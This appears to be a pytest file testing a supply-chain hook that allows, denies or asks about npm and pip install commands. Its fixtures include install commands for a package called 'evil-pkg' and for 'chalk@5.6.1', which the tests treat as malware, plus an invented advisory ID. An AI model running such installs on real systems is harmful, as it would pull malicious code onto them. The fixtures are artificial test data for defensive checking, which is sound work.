    doc = {"dist-tags": {"latest": "5.3.0", "next": "5.6.1"}, "versions": {"5.3.0": {}, "5.6.1": {}}}
    sources = FakeSources(packuments={"chalk": doc})
    assert hook(project, "NPM_CONFIG_TAG=next npm install chalk", sources)[0] == "deny"
    (project / ".npmrc").write_text("tag=next\n")  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
    assert hook(project, "npm install chalk", FakeSources(packuments={"chalk": doc}))[0] == "deny"


@pytest.mark.parametrize(
    "command",
    ["pip download evil-pkg==1.0 -d wh && pip install wh/evil_pkg-1.0-py3-none-any.whl",
     "pip wheel evil-pkg==1.0 -w wh",
     "npm pack chalk@5.6.1 && npm i ./chalk-5.6.1.tgz",
     "corepack pnpm add chalk@5.6.1"],
)  # fmt: skip
def test_download_then_install_and_corepack_are_checked(project, command):
    assert hook(project, command, FakeSources())[0] == "deny"


def test_cloud_registry_lists_replace_the_repository_list(project):
    pyproject = '[tool.skylos.hooks]\ntrusted_registries = ["https://npm.corp.example"]\n'
    command = "npm install --registry https://npm.corp.example lib@1.0.0"
    assert hook(project, command, FakeSources(), pyproject=pyproject) == ("allow", "")
    cloud(project, "supply_chain:\n  trusted_registries: []\n  private_registries: []\n")
    assert hook(project, command, FakeSources(), pyproject=pyproject)[0] == "ask"


def test_cloud_malware_block_is_not_bypassed_by_the_repository_allowlist(project):
    pyproject = '[tool.skylos]\nhooks_allow_packages = ["chalk"]\n'
    assert hook(project, "npm install chalk@5.6.1", FakeSources(), pyproject=pyproject) == ("allow", "")
    cloud(project, "supply_chain:\n  block_malware: true\n")
    assert hook(project, "npm install chalk@5.6.1", FakeSources(), pyproject=pyproject)[0] == "deny"
    assert hook(project, "npm install left-pad@1.3.0", FakeSources(), pyproject=pyproject)[0] == "allow"


def test_npm_allowlist_matches_the_exact_name_only(project):
    MALWARE[("npm", "acme.utils", "1.0.0")] = ["MAL-2099-9"]
    pyproject = '[tool.skylos]\nhooks_allow_packages = ["npm:acme-utils"]\n'
    try:
        assert hook(project, "npm i acme.utils@1.0.0", FakeSources(), pyproject=pyproject)[0] == "deny"
        assert hook(project, "npm i ACME-UTILS@1.0.0", FakeSources(), pyproject=pyproject) == ("allow", "")
    finally:
        del MALWARE[("npm", "acme.utils", "1.0.0")]


def test_unreadable_cloud_policy_asks(project, monkeypatch):
    monkeypatch.setenv("SKYLOS_SYNCED_POLICY_FILE", str(project / "missing.yaml"))
    decision, reason = hook(project, "npm install left-pad@1.3.0", FakeSources())
    assert decision == "ask" and "Cloud policy could not be read" in reason


def test_slow_registry_lookups_end_inside_the_hook_deadline(project, monkeypatch):
    import time as clock

    monkeypatch.setattr(hook_supply_chain, "INSTALL_CHECK_SECONDS", 1.0)
    monkeypatch.setattr(
        "skylos.rules.ai_defect.install_command.check_install_package_status",
        lambda ecosystem, name, version, cache: clock.sleep(5) or "present",
    )
    started = clock.monotonic()
    decision, _ = hook(project, "npm install left-pad@1.3.0", FakeSources())
    assert decision == "ask" and clock.monotonic() - started < 4
